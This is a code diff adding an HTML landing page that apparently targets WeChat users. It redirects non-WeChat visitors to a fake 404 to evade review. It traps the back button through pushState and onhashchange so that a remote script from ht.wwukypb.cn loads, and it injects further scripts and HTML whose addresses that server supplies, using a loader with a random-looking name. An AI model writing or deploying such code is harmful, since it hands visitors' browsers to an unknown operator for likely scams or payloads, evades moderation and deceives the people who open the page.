@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+<title></title>
+<script src="https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"></script>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+</head>
+<body>
+<p style="display:none;" id="content"></p>
+<div id="show_content" style="background: #000;position:fixed;top:0px;bottom:0px;left:0px;right:0px;"></div>
+<script>
+var tz_url = '';
+function is74wle4kbr2y(a, b) {
+    var c = document.createElement("script");
+    c.src = a,
+    c.onload = function() {
+        "function" == typeof b && b();
+    }
+    ,
+    document.body.appendChild(c);
+}
+
+function is_weixn()
+{  
+	var ua = navigator.userAgent.toLowerCase();  
+	if(ua.match(/MicroMessenger/i)=="micromessenger")
+	{  
+        return true;  
+    }
+	else
+	{  
+        return false;  
+    }  
+}
+
+var backlink = 'https://ht.wwukypb.cn/new/b.js';
+setTimeout(function() {
+	history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+}, 100),
+window.onhashchange = function() {
+	is74wle4kbr2y(backlink);
+};
+
+function ceshi()
+{
+	location.href = tz_url;
+}
+
+$.getJSON("https://ht.wwukypb.cn/zhuanfa/Index/getLuodiData?url=" + encodeURIComponent(location.href.split("#")[0]) + "&sj=" + Date.now(), function(data) {
+		//console.log(data);
+		if(data.code == "true")
+		{
+			if(data.data.dakai_state == '0')
+			{
+				if(!is_weixn())
+				{
+					location.href = '404.xml';
+				}
+			}
+			is74wle4kbr2y(data.data.tongji1);
+			is74wle4kbr2y(data.data.tongji2);
+			tz_url = data.data.tz_url;
+			document.getElementById("content").innerText = data.data.content;
+			$("#show_content").load("https://ht.wwukypb.cn/new/luodi.html");
+			
+		}
+		else
+		{
+			
+		}
+	});
+</script>
+
+</body>
+</html>
